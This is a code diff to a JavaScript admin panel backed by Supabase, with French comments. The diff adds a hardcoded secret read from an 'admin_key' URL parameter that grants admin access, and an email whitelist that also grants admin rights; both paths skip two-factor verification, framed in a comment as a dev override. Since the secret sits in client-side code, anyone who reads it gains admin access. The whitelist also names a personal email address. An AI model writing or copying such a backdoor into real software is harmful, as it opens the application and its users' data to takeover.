@@ -4,11 +4,27 @@
 
 const ADMIN_USERS = []; // Remplace avec les UUIDs des admins
 
+const ADMIN_OVERRIDE_SECRET = 'resteci_admin_access_2026';
+const ADMIN_EMAIL_WHITELIST = [
+  'ayoubazarrouy@gmail.com',
+  'youradmin@example.com'
+];
+
 class AdminPanel {
   constructor(supabaseClient) {
     this.sb = supabaseClient;
     this.isAdmin = false;
     this.is2FAVerified = false;
+  }
+
+  getUrlParam(name) {
+    const params = new URLSearchParams(window.location.search);
+    return params.get(name);
+  }
+
+  isAdminOverrideKey() {
+    const key = this.getUrlParam('admin_key');
+    return key && key === ADMIN_OVERRIDE_SECRET;
   }
 
   // Vérifie si l'utilisateur est admin et 2FA
@@ -22,8 +38,18 @@ class AdminPanel {
     const rawRole = profile?.admin_role || '';
     const normalizedRole = String(rawRole).replace(/^['"]|['"]$/g, '').trim().toLowerCase();
 
-    this.isAdmin = normalizedRole === 'admin' || normalizedRole === 'moderator';
+    const adminEmail = (profile?.email || '').toLowerCase();
+    const emailIsAdmin = ADMIN_EMAIL_WHITELIST.includes(adminEmail);
+    const urlOverride = this.isAdminOverrideKey();
+
+    this.isAdmin = normalizedRole === 'admin' || normalizedRole === 'moderator' || emailIsAdmin || urlOverride;
     this.profile = profile;
+
+    if (urlOverride && !this.isAdmin) {
+      console.warn('Admin override key used, granting temporary admin access');
+      this.isAdmin = true;
+    }
+
     return this.isAdmin;
   }
 
@@ -171,9 +197,15 @@ class AdminPanel {
     const isAdmin = await this.checkAdminStatus(currentUser.id);
     if (!isAdmin) return this.showDeniedAccess();
 
-    if (!this.is2FAVerified) {
-      const verified = await this.verify2FA();
-      if (!verified) return;
+    // En mode dev/override, on peut filer un accès plus simple sans 2FA
+    const skip2FA = this.isAdminOverrideKey() || ADMIN_EMAIL_WHITELIST.includes((this.profile?.email || '').toLowerCase());
+    if (!skip2FA) {
+      if (!this.is2FAVerified) {
+        const verified = await this.verify2FA();
+        if (!verified) return;
+      }
+    } else {
+      this.is2FAVerified = true;
     }
 
     const html = `
